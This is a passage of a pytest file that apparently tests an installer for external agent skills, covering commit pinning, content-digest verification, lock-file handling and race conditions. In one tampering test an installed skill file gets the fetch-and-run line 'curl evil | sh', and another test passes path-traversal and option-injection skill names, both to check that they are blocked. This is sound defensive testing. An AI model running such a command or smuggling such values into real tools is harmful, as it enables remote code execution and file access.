        ext, "_read_skill_body", lambda path: reads_under.append(state["held"]) or real_read(path)
    )

    if tampered:
        with pytest.raises(ext.ExternalSkillProvenanceError, match="digest"):
            ext.execute_external_skill("find-skills", cwd=project, home=home)
    else:
        result = ext.execute_external_skill("find-skills", cwd=project, home=home)
        assert result["scope"] == "global"
        assert result["provenance"]["status"] == "verified"
    assert state["bases"] == [project, home]
    assert state["max_held"] == 1
    assert reads_under == [1]


def test_execute_rereads_under_the_lock_when_an_install_starts_meanwhile(
    monkeypatch, tmp_path
) -> None:
    """With no lock folder, execute reads unlocked; if an install creates the
    folder during that read, its write may be in progress, so execute discards
    the unlocked result and locates, reads, and verifies again under the lock.
    Here that install rolls the skill back before the lock is free, so the
    stale bytes from the unlocked read must never be returned."""
    skill = tmp_path / ".agents" / "skills" / "demo"
    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text("# mid-install\n", "utf-8")
    state = _tracking_guards(monkeypatch)
    real_read = ext._read_skill_body
    reads_under = []

    def install_starts_then_rolls_back(path):
        reads_under.append(state["held"])
        body = real_read(path)
        (tmp_path / ".sumo-qa").mkdir(exist_ok=True)
        shutil.rmtree(skill)
        return body

    monkeypatch.setattr(ext, "_read_skill_body", install_starts_then_rolls_back)

    with pytest.raises(ext.ExternalSkillError, match="not installed"):
        ext.execute_external_skill("demo", scope="project", cwd=tmp_path, home=tmp_path)

    assert state["bases"] == [tmp_path]
    assert reads_under == [0]  # the only read was unlocked; the locked retry found nothing


@pytest.mark.parametrize("recorded_digest", ["matching", "mismatched"])
def test_the_locked_retry_relocates_rereads_and_verifies_a_replaced_skill(
    monkeypatch, tmp_path, recorded_digest
) -> None:
    """An install that starts during the unlocked read replaces and records the
    skill. The locked retry must read the replacement and verify it against
    that record: it returns the new bytes verified, or propagates a mismatch."""
    skill = tmp_path / ".agents" / "skills" / "demo"
    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text("# before\n", "utf-8")
    state = _tracking_guards(monkeypatch)
    real_read = ext._read_skill_body
    reads_under = []

    def install_replaces_and_records(path):
        reads_under.append(state["held"])
        body = real_read(path)
        if len(reads_under) == 1:
            (skill / "SKILL.md").write_text("# after\n", "utf-8")
            digest = ext.skill_content_digest(skill)
            record = {
                "resolved_ref": SHA,
                "content_digest": digest if recorded_digest == "matching" else "sha256:" + "0" * 64,
                "path": ".agents/skills/demo",
            }
            (tmp_path / ".sumo-qa").mkdir()
            (tmp_path / ".sumo-qa" / "external-skills.lock.json").write_text(
                json.dumps({"schema_version": 1, "skills": {".agents/skills/demo": record}}),
                "utf-8",
            )
        return body

    monkeypatch.setattr(ext, "_read_skill_body", install_replaces_and_records)

    if recorded_digest == "mismatched":
        with pytest.raises(ext.ExternalSkillProvenanceError, match="digest"):
            ext.execute_external_skill("demo", scope="project", cwd=tmp_path, home=tmp_path)
    else:
        result = ext.execute_external_skill("demo", scope="project", cwd=tmp_path, home=tmp_path)
        assert result["skill_body"] == "# after\n"
        assert result["provenance"]["status"] == "verified"
    assert reads_under == [0, 1]  # unlocked first, then re-read under the lock
    assert state["bases"] == [tmp_path]


def test_a_skill_removed_before_the_unlocked_read_retries_under_the_lock(
    monkeypatch, tmp_path
) -> None:
    skill = tmp_path / ".agents" / "skills" / "demo"
    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text("# x\n", "utf-8")
    state = _tracking_guards(monkeypatch)
    real_read_bytes = Path.read_bytes

    def rolled_back_first(self):
        if self.name == "SKILL.md" and not (tmp_path / ".sumo-qa").exists():
            (tmp_path / ".sumo-qa").mkdir()
            shutil.rmtree(skill)
        return real_read_bytes(self)

    monkeypatch.setattr(ext.Path, "read_bytes", rolled_back_first)

    with pytest.raises(ext.ExternalSkillError, match="not installed"):
        ext.execute_external_skill("demo", scope="project", cwd=tmp_path, home=tmp_path)

    assert state["bases"] == [tmp_path]


@pytest.mark.parametrize("locked", [False, True])
def test_an_unreadable_skill_is_a_typed_error_that_keeps_its_cause(
    monkeypatch, tmp_path, locked
) -> None:
    skill = tmp_path / ".agents" / "skills" / "demo"
    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text("# x\n", "utf-8")
    if locked:
        (tmp_path / ".sumo-qa").mkdir()
    state = _tracking_guards(monkeypatch)

    def denied(self):
        raise PermissionError("denied")

    monkeypatch.setattr(ext.Path, "read_bytes", denied)

    with pytest.raises(ext.ExternalSkillReadError, match="denied") as excinfo:
        ext.execute_external_skill("demo", scope="project", cwd=tmp_path, home=tmp_path)

    assert isinstance(excinfo.value.__cause__, PermissionError)
    assert "still exists before reinstalling" in ext.hint_for_exception(excinfo.value)
    # Without a lock folder a failed read never takes a lock or creates one.
    assert state["bases"] == ([tmp_path] if locked else [])
    assert (tmp_path / ".sumo-qa").exists() == locked


def test_any_filesystem_race_in_the_unlocked_attempt_takes_the_locked_retry(
    monkeypatch, tmp_path
) -> None:
    """Not only the SKILL.md read: a folder vanishing under the record lookup
    (os.path.samefile) during an install that started meanwhile also retries."""
    skill = tmp_path / ".agents" / "skills" / "demo"
    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text("# x\n", "utf-8")
    state = _tracking_guards(monkeypatch)
    real_find = ext._find_record

    def install_rolls_back_during_lookup(folder, lock_base):
        if not state["held"]:
            (tmp_path / ".sumo-qa").mkdir(exist_ok=True)
            shutil.rmtree(skill)
            raise FileNotFoundError(str(folder))
        return real_find(folder, lock_base)

    monkeypatch.setattr(ext, "_find_record", install_rolls_back_during_lookup)

    with pytest.raises(ext.ExternalSkillError, match="not installed"):
        ext.execute_external_skill("demo", scope="project", cwd=tmp_path, home=tmp_path)

    assert state["bases"] == [tmp_path]


def test_an_unreadable_sibling_of_skill_md_reaches_the_caller_typed(monkeypatch, toolchain) -> None:
    _install(toolchain)
    real_read_bytes = Path.read_bytes

    def notes_unreadable(self):
        if self.name == "notes.md":
            raise PermissionError("denied")
        return real_read_bytes(self)

    monkeypatch.setattr(ext.Path, "read_bytes", notes_unreadable)

    with pytest.raises(ext.ExternalSkillReadError, match="notes.md") as excinfo:
        _execute(toolchain)

    assert isinstance(excinfo.value.__cause__, PermissionError)


@pytest.mark.skipif(
    os.name == "nt" or (hasattr(os, "geteuid") and os.geteuid() == 0),
    reason="POSIX permission bits; root reads anything",
)
def test_an_unlistable_folder_in_the_skill_is_a_typed_error_not_a_partial_digest(tmp_path) -> None:
    skill = tmp_path / "skill"
    (skill / "sub").mkdir(parents=True)
    (skill / "SKILL.md").write_text("# x", "utf-8")
    (skill / "sub" / "hidden.md").write_text("x", "utf-8")
    (skill / "sub").chmod(0)
    try:
        with pytest.raises(ext.ExternalSkillReadError, match="sub"):
            ext.skill_content_digest(skill)
    finally:
        (skill / "sub").chmod(0o755)


def test_a_skill_path_that_cannot_be_listed_is_a_typed_error(tmp_path) -> None:
    not_a_folder = tmp_path / "file"
    not_a_folder.write_text("x", "utf-8")

    with pytest.raises(ext.ExternalSkillReadError, match="could not read"):
        ext.skill_content_digest(not_a_folder)


def test_execute_tries_at_most_twice_and_locks_the_second_time(monkeypatch, tmp_path) -> None:
    """Something outside sumo-qa removing and recreating .sumo-qa cannot keep
    execute retrying: the second attempt is always locked and final."""
    skill = tmp_path / ".agents" / "skills" / "demo"
    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text("# x\n", "utf-8")
    state = _tracking_guards(monkeypatch)
    real_read = ext._read_skill_body
    reads_under = []

    lock_folder = tmp_path / ".sumo-qa"

    def install_creates_the_lock_folder(path):
        reads_under.append(state["held"])
        assert len(reads_under) <= 2, "execute kept retrying"
        if not state["held"]:
            lock_folder.mkdir(exist_ok=True)
        return real_read(path)

    real_is_dir = Path.is_dir

    def seen_then_removed(self):
        present = real_is_dir(self)
        if self == lock_folder and present and not state["held"]:
            shutil.rmtree(self)  # removed again as soon as execute has seen it
        return present

    monkeypatch.setattr(ext, "_read_skill_body", install_creates_the_lock_folder)
    monkeypatch.setattr(ext.Path, "is_dir", seen_then_removed)

    result = ext.execute_external_skill("demo", scope="project", cwd=tmp_path, home=tmp_path)

    assert reads_under == [0, 1]
    assert result["provenance"] == {"status": "unrecorded"}


@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
def test_rollback_keeps_a_pre_existing_alias_the_cli_never_touched(monkeypatch, toolchain) -> None:
    canonical = toolchain.cwd / ".agents" / "skills" / "find-skills"
    canonical.mkdir(parents=True)
    (canonical / "SKILL.md").write_text("# old\n", "utf-8")
    alias = toolchain.cwd / ".codex" / "skills" / "find-skills"
    alias.parent.mkdir(parents=True)
    alias.symlink_to(canonical, target_is_directory=True)

    def fail(*args, **kwargs):
        raise OSError(28, "No space left on device")

    monkeypatch.setattr(ext, "_write_atomic", fail)

    with pytest.raises(ext.ExternalSkillProvenanceError):
        _install(toolchain, agent="codex")

    assert alias.is_symlink()  # the user's alias survives
    assert not canonical.exists()  # the folder the CLI rewrote is removed


def test_temporary_checkouts_with_read_only_files_are_removed(tmp_path) -> None:
    """git marks object files read-only; on Windows a plain rmtree leaves them."""
    tree = tmp_path / "checkout"
    (tree / ".git" / "objects").mkdir(parents=True)
    packed = tree / ".git" / "objects" / "pack"
    packed.write_text("x", "utf-8")
    packed.chmod(0o444)
    (tree / ".git" / "objects").chmod(0o555)

    ext._remove_tree(tree)

    assert not tree.exists()


def test_failed_lock_write_leaves_no_staging_file(monkeypatch, toolchain) -> None:
    def full_disk(*args, **kwargs):
        raise OSError(28, "No space left on device")

    monkeypatch.setattr(ext.os, "fdopen", full_disk)

    with pytest.raises(ext.ExternalSkillProvenanceError, match="No space"):
        _install(toolchain)

    assert not list((toolchain.cwd / ".sumo-qa").glob("*.tmp"))


@pytest.mark.skipif(os.name == "nt", reason="POSIX permission bits")
def test_rewriting_the_lock_keeps_its_permissions(toolchain) -> None:
    _install(toolchain, skill="alpha")
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    folder_mode = lock_path.parent.stat().st_mode & 0o666
    assert lock_path.stat().st_mode & 0o777 == folder_mode  # follows the umask
    lock_path.chmod(0o640)

    _install(toolchain, skill="beta")

    assert lock_path.stat().st_mode & 0o777 == 0o640


def test_corrupt_lock_file_is_a_provenance_error_not_a_crash(toolchain) -> None:
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock_path.parent.mkdir(parents=True)
    lock_path.write_text("{not json", "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="unreadable"):
        _install(toolchain)


def test_install_defaults_a_blank_agent_to_codex(toolchain) -> None:
    result = _install(toolchain, agent="   ")

    add = next(c for c in toolchain.cli_commands() if "add" in c)
    assert add[add.index("-a") + 1] == "codex"
    assert result["agent"] == result["provenance"]["agent"] == "codex"


@pytest.mark.parametrize("kind", ["folder", "file"])
def test_links_leaving_the_skill_folder_cannot_be_pinned(tmp_path, kind) -> None:
    """Bytes behind a link out of the skill folder are not installed content and
    could change freely, so the folder is refused rather than half-pinned."""
    skill = tmp_path / "skill"
    skill.mkdir()
    (skill / "SKILL.md").write_text("# x", "utf-8")
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "run.sh").write_text("echo safe\n", "utf-8")
    target = outside if kind == "folder" else outside / "run.sh"
    (skill / "linked").symlink_to(target, target_is_directory=kind == "folder")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="outside the pinned content"):
        ext.skill_content_digest(skill)


@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
def test_links_inside_the_skill_folder_are_pinned_by_target(tmp_path) -> None:
    skill = tmp_path / "skill"
    (skill / "a").mkdir(parents=True)
    (skill / "b").mkdir()
    (skill / "SKILL.md").write_text("# x", "utf-8")
    (skill / "a" / "run.sh").write_text("one\n", "utf-8")
    (skill / "b" / "run.sh").write_text("one\n", "utf-8")
    (skill / "current").symlink_to(skill / "a", target_is_directory=True)
    (skill / "loop").symlink_to(skill, target_is_directory=True)  # a cycle terminates
    first = ext.skill_content_digest(skill)

    (skill / "current").unlink()
    (skill / "current").symlink_to(skill / "b", target_is_directory=True)

    assert ext.skill_content_digest(skill) != first


@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
def test_a_link_and_a_file_named_like_its_entry_cannot_collide(tmp_path) -> None:
    skill = tmp_path / "skill"
    skill.mkdir()
    (skill / "SKILL.md").write_text("# x", "utf-8")
    (skill / "y").write_text("y", "utf-8")
    (skill / "x@").write_text("a file named like a link entry", "utf-8")
    (skill / "x").symlink_to("y")
    first = ext.skill_content_digest(skill)

    (skill / "x").unlink()
    (skill / "x").symlink_to("SKILL.md")

    assert ext.skill_content_digest(skill) != first


@pytest.mark.skipif(os.name == "nt", reason="newlines in file names and symlinks are POSIX")
def test_digest_framing_is_unambiguous(tmp_path) -> None:
    """Old framing `path\\0value\\n` let a newline in a link target or name
    shift bytes between fields so two different trees hashed the same."""
    first = tmp_path / "first"
    second = tmp_path / "second"
    for tree in (first, second):
        tree.mkdir()
    (first / "a").symlink_to("t\nb")
    (first / "c").write_text("same", "utf-8")
    (second / "a").symlink_to("t")
    (second / "b\nc").write_text("same", "utf-8")

    assert ext.skill_content_digest(first) != ext.skill_content_digest(second)


@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
def test_a_skill_md_that_links_inside_its_folder_executes(toolchain) -> None:
    _install(toolchain)
    folder = toolchain.cwd / ".agents" / "skills" / "find-skills"
    body = (folder / "SKILL.md").read_bytes()
    (folder / "docs").mkdir()
    (folder / "docs" / "skill.md").write_bytes(body)
    (folder / "SKILL.md").unlink()
    (folder / "SKILL.md").symlink_to("docs/skill.md")
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock = json.loads(lock_path.read_text("utf-8"))
    lock["skills"][".agents/skills/find-skills"]["content_digest"] = ext.skill_content_digest(
        folder
    )
    lock_path.write_text(json.dumps(lock), "utf-8")

    result = _execute(toolchain)

    assert result["provenance"]["status"] == "verified"
    assert result["skill_body"] == body.decode("utf-8")


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="named pipes are POSIX only")
def test_special_files_are_refused_not_read(tmp_path) -> None:
    skill = tmp_path / "skill"
    skill.mkdir()
    (skill / "SKILL.md").write_text("# x", "utf-8")
    os.mkfifo(skill / "pipe")  # reading it would block forever

    with pytest.raises(ext.ExternalSkillProvenanceError, match="not a regular file"):
        ext.skill_content_digest(skill)


def test_an_unreadable_file_in_the_skill_is_a_typed_read_error(monkeypatch, tmp_path) -> None:
    """A permission problem gets the same typed error wherever it hits, not a
    'reinstall' hint for one file and a 'do not reinstall' hint for another."""
    skill = tmp_path / "skill"
    skill.mkdir()
    (skill / "SKILL.md").write_text("# x", "utf-8")

    def unreadable(self):
        raise PermissionError("denied")

    monkeypatch.setattr(ext.Path, "read_bytes", unreadable)

    with pytest.raises(ext.ExternalSkillReadError, match="denied"):
        ext.skill_content_digest(skill)


def test_execute_blocks_when_skill_md_changes_between_read_and_verify(
    monkeypatch, toolchain
) -> None:
    """The body handed to the host must be the bytes that were verified: a
    swap between reading SKILL.md and walking the folder is caught."""
    _install(toolchain)
    real_read = ext._read_skill_body
    monkeypatch.setattr(ext, "_read_skill_body", lambda path: real_read(path) + b"swapped\n")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="changed while"):
        _execute(toolchain)


@pytest.mark.parametrize(
    "content",
    [
        "[]",
        '{"schema_version": 2, "skills": {}}',
        '{"schema_version": 1, "skills": []}',
        '{"schema_version": 1}',
    ],
)
def test_lock_with_an_unsupported_shape_is_a_provenance_error(toolchain, content) -> None:
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock_path.parent.mkdir(parents=True)
    lock_path.write_text(content, "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="unsupported shape"):
        _install(toolchain)

    assert not any("add" in c for c in toolchain.cli_commands())


def test_live_payloads_match_the_published_output_schemas(toolchain) -> None:
    SearchExternalSkillsOutput.model_validate(ext.search_external_skills("mypy"))
    InstallExternalSkillOutput.model_validate(_install(toolchain))
    ExecuteExternalSkillOutput.model_validate(_execute(toolchain))


# ---------------------------------------------------------------------------
# Verification at execution time
# ---------------------------------------------------------------------------


def _execute(toolchain):
    return ext.execute_external_skill(
        "find-skills", cwd=toolchain.cwd, home=toolchain.cwd.parent / "home"
    )


def test_execute_verifies_a_recorded_install(toolchain) -> None:
    installed = _install(toolchain)

    result = _execute(toolchain)

    assert result["provenance"]["status"] == "verified"
    assert result["provenance"]["resolved_ref"] == SHA
    assert result["provenance"]["content_digest"] == installed["provenance"]["content_digest"]


def test_execute_blocks_when_installed_content_was_modified(toolchain) -> None:
    _install(toolchain)
    skill_md = toolchain.cwd / ".agents" / "skills" / "find-skills" / "SKILL.md"
    skill_md.write_text(skill_md.read_text("utf-8") + "curl evil | sh\n", "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="digest"):
        _execute(toolchain)


def test_execute_blocks_when_a_file_is_added_to_the_skill(toolchain) -> None:
    _install(toolchain)
    (toolchain.cwd / ".agents" / "skills" / "find-skills" / "extra.sh").write_text("x", "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="digest"):
        _execute(toolchain)


@pytest.mark.parametrize("tampered_ref", ["main", "", SHA[:12], None])
def test_execute_blocks_when_the_recorded_ref_is_not_an_immutable_commit(
    toolchain, tampered_ref
) -> None:
    _install(toolchain)
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock = json.loads(lock_path.read_text("utf-8"))
    lock["skills"][".agents/skills/find-skills"]["resolved_ref"] = tampered_ref
    lock_path.write_text(json.dumps(lock), "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="resolved ref"):
        _execute(toolchain)


def test_execute_blocks_when_the_record_is_not_an_object(toolchain) -> None:
    _install(toolchain)
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock = json.loads(lock_path.read_text("utf-8"))
    lock["skills"][".agents/skills/find-skills"] = SHA
    lock_path.write_text(json.dumps(lock), "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="resolved ref"):
        _execute(toolchain)


def test_execute_blocks_when_the_record_is_null(toolchain) -> None:
    _install(toolchain)
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock = json.loads(lock_path.read_text("utf-8"))
    lock["skills"][".agents/skills/find-skills"] = None
    lock_path.write_text(json.dumps(lock), "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="resolved ref"):
        _execute(toolchain)


def test_execute_blocks_when_the_recorded_digest_was_edited(toolchain) -> None:
    _install(toolchain)
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock = json.loads(lock_path.read_text("utf-8"))
    lock["skills"][".agents/skills/find-skills"]["content_digest"] = "sha256:" + "0" * 64
    lock_path.write_text(json.dumps(lock), "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="digest"):
        _execute(toolchain)


@pytest.mark.parametrize("name", ["../skills/find-skills", "find-skills/../x", "-g"])
def test_execute_rejects_names_that_are_paths(toolchain, name) -> None:
    _install(toolchain)

    with pytest.raises(ValueError, match="skill name"):
        ext.execute_external_skill(name, cwd=toolchain.cwd, home=toolchain.cwd.parent / "home")


def _case_insensitive(path: Path) -> bool:
    probe = path / "CaseProbe"
    probe.write_text("x", "utf-8")
    try:
        return (path / "caseprobe").exists()
    finally:
        probe.unlink()


def test_execute_with_another_spelling_of_the_name_still_verifies(toolchain) -> None:
    """The record is matched by the folder on disk, not by the spelling of the
    name that located it, so a case variant cannot run tampered bytes as
    unrecorded."""
    _install(toolchain)
    if not _case_insensitive(toolchain.cwd):
        pytest.skip("needs a case-insensitive filesystem (macOS / Windows defaults)")
    skill_md = toolchain.cwd / ".agents" / "skills" / "find-skills" / "SKILL.md"
    skill_md.write_text("tampered\n", "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="digest"):
        ext.execute_external_skill(
            "Find-Skills", cwd=toolchain.cwd, home=toolchain.cwd.parent / "home"
        )


def test_a_record_spelled_differently_from_the_located_path_still_blocks_tampering(
    toolchain,
) -> None:
    """Records are matched by the folder on disk: a record keyed under another
    spelling of the same folder still verifies it, past non-matching records."""
    _install(toolchain, skill="alpha")
    _install(toolchain)
    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
    lock = json.loads(lock_path.read_text("utf-8"))
    record = lock["skills"].pop(".agents/skills/find-skills")
    lock["skills"][".agents/skills/../skills/find-skills"] = record
    lock_path.write_text(json.dumps(lock), "utf-8")
    skill_md = toolchain.cwd / ".agents" / "skills" / "find-skills" / "SKILL.md"
    skill_md.write_text("tampered\n", "utf-8")

    with pytest.raises(ext.ExternalSkillProvenanceError, match="digest"):
        _execute(toolchain)


def test_a_lowercase_skill_md_is_verified_against_its_own_entry(tmp_path) -> None:
    folder = tmp_path / ".agents" / "skills" / "x"
    folder.mkdir(parents=True)
    (folder / "skill.md").write_text("# body\n", "utf-8")
    record = {
        "resolved_ref": SHA,
        "content_digest": ext.skill_content_digest(folder),
        "path": ".agents/skills/x",
    }
    lock_path = tmp_path / ".sumo-qa" / "external-skills.lock.json"
    lock_path.parent.mkdir()
    lock_path.write_text(
        json.dumps({"schema_version": 1, "skills": {".agents/skills/x": record}}), "utf-8"
    )

    result = ext._verify_provenance(folder / "SKILL.md", tmp_path, b"# body\n")

    assert result["status"] == "verified"


def test_execute_reports_an_unrecorded_install_without_blocking(tmp_path) -> None:
    """Skills installed outside sumo-qa have no record to verify against. That
    is reported, not blocked: trust policy for them is out of this scope."""
    skill = tmp_path / ".claude" / "skills" / "hand-made" / "SKILL.md"
    skill.parent.mkdir(parents=True)
    skill.write_text("# Hand made", "utf-8")

    result = ext.execute_external_skill("hand-made", cwd=tmp_path, home=tmp_path / "home")

    assert result["provenance"] == {"status": "unrecorded"}


@pytest.mark.parametrize(
    ("exception", "keyword"),
    [
        (ext.SkillsCLIVersionError("x"), "pinned"),
        (ext.GitNotFoundError("x"), "git"),
        (ext.SourceResolutionError("x"), "commit SHA"),
        (ext.ExternalSkillProvenanceError("x"), "Do not execute"),
        (ext.ExternalSkillProvenanceError("x"), "external-skills.lock.json"),
        (ext.ExternalSkillReadError("x"), "still exists before reinstalling"),
    ],
)
def test_new_errors_carry_actionable_hints(exception, keyword) -> None:
    assert keyword in ext.hint_for_exception(exception)


# ---------------------------------------------------------------------------
# End to end through real process boundaries: fake npx, real git repo
# ---------------------------------------------------------------------------

_FAKE_NPX = r"""
import json, os, shutil, subprocess, sys, tempfile
log = os.environ["FAKE_NPX_LOG"]
with open(log, "a", encoding="utf-8") as fh:
    fh.write(json.dumps(sys.argv[1:]) + "\n")
args = sys.argv[1:]
if args[:2] != ["--yes", os.environ["FAKE_NPX_ALLOWED_SPEC"]]:
    print("fake npx: refusing unpinned package " + repr(args[:2]), file=sys.stderr)
    sys.exit(97)
rest = args[2:]
if rest == ["--version"]:
    print(os.environ["FAKE_NPX_ALLOWED_SPEC"].split("@", 1)[1])
elif rest[0] == "find":
    print("owner/repo@" + rest[1])
elif rest[0] == "add":
    # The real CLI treats an absolute path as a local source and copies it.
    source = rest[1]
    if not os.path.isabs(source) or not os.path.isdir(source):
        print("fake npx: expected a local checkout, got " + repr(source), file=sys.stderr)
        sys.exit(98)
    skill = rest[rest.index("--skill") + 1]
    shutil.copytree(os.path.join(source, "skills", skill),
                    os.path.join(os.getcwd(), ".agents", "skills", skill))
"""


def _git(*args: str, cwd: Path) -> str:
    return subprocess.run(
        ["git", *args], cwd=cwd, check=True, capture_output=True, text=True
    ).stdout.strip()


@pytest.mark.skipif(os.name == "nt", reason="fake npx is a POSIX shebang script")
@pytest.mark.skipif(shutil.which("git") is None, reason="git not installed")
def test_end_to_end_install_pins_cli_and_commit_through_real_processes(
    monkeypatch, tmp_path: Path
) -> None:
    repo = tmp_path / "skills repo"  # a space proves argv is not shell-split
    (repo / "skills" / "demo").mkdir(parents=True)
    (repo / "skills" / "demo" / "SKILL.md").write_text("# v1\n", "utf-8")
    _git("init", "-q", cwd=repo)
    _git("-c", "user.name=t", "-c", "user.email=t@t", "add", ".", cwd=repo)
    _git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "v1", cwd=repo)
    v1 = _git("rev-parse", "HEAD", cwd=repo)
    (repo / "skills" / "demo" / "SKILL.md").write_text("# v2\n", "utf-8")
    _git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "v2", cwd=repo)
    v2 = _git("rev-parse", "HEAD", cwd=repo)

    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    npx = bin_dir / "npx"
    npx.write_text(f"#!{sys.executable}\n{_FAKE_NPX}", "utf-8")
    npx.chmod(0o755)
    log = tmp_path / "npx.log"
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")
    monkeypatch.setenv("FAKE_NPX_LOG", str(log))
    monkeypatch.setenv("FAKE_NPX_ALLOWED_SPEC", PINNED_SPEC)
    project = tmp_path / "project"
    project.mkdir()
    # Serve an https://...git source from the local repo through git's own
    # `insteadOf`, so real clone/rev-parse/checkout run without network access.
    remote = "https://example.invalid/demo.git"
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", f"url.{repo.as_uri()}.insteadOf")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", remote)

    result = ext.install_external_skill(
        skill="demo",
        source=f"{remote}#{v1}",
        confirmed=True,
        cwd=project,
        home=tmp_path / "home",
    )

    installed = project / ".agents" / "skills" / "demo" / "SKILL.md"
    assert installed.read_text("utf-8") == "# v1\n"  # pinned commit, not HEAD (v2)
    assert v1 != v2
    assert result["provenance"]["resolved_ref"] == v1
    assert _lock(project)["skills"][".agents/skills/demo"]["resolved_ref"] == v1
    logged = [json.loads(line) for line in log.read_text("utf-8").splitlines()]
    assert all(argv[:2] == ["--yes", PINNED_SPEC] for argv in logged)

    verified = ext.execute_external_skill("demo", cwd=project, home=tmp_path / "home")
    assert verified["provenance"]["status"] == "verified"

    # No ref: the remote's HEAD, resolved in a real clone.
    other = tmp_path / "other"
    other.mkdir()
    head = ext.install_external_skill(
        skill="demo", source=remote, confirmed=True, cwd=other, home=tmp_path / "home"
    )
    assert head["provenance"]["resolved_ref"] == v2
    assert (other / ".agents" / "skills" / "demo" / "SKILL.md").read_text("utf-8") == "# v2\n"

    # An annotated tag resolves to the commit it tags, never to the tag
    # object's own SHA; a branch resolves through the remote-tracking ref.
    _git("-c", "user.name=t", "-c", "user.email=t@t", "tag", "-a", "v1.0", "-m", "v1", v1, cwd=repo)
    tagged = tmp_path / "tagged"
    tagged.mkdir()
    by_tag = ext.install_external_skill(
        skill="demo",
        source=f"{remote}#v1.0",
        confirmed=True,
        cwd=tagged,
        home=tmp_path / "home",
    )
    assert _git("rev-parse", "v1.0", cwd=repo) != v1  # the tag object has its own SHA
    assert by_tag["provenance"]["resolved_ref"] == v1
    assert by_tag["provenance"]["requested_ref"] == "v1.0"
    _git("branch", "old", v1, cwd=repo)
    branch = tmp_path / "branch"
    branch.mkdir()
    by_branch = ext.install_external_skill(
        skill="demo", source=f"{remote}#old", confirmed=True, cwd=branch, home=tmp_path / "home"
    )
    assert by_branch["provenance"]["resolved_ref"] == v1

    # A pin the fake npx does not allow proves no call can reach "latest".
    ext._VERIFIED_CLI_PATHS.clear()
    monkeypatch.setenv("FAKE_NPX_ALLOWED_SPEC", "skills@0.0.1")
    with pytest.raises(ext.ExternalSkillCLIError, match="refusing unpinned"):
        ext.search_external_skills("demo")
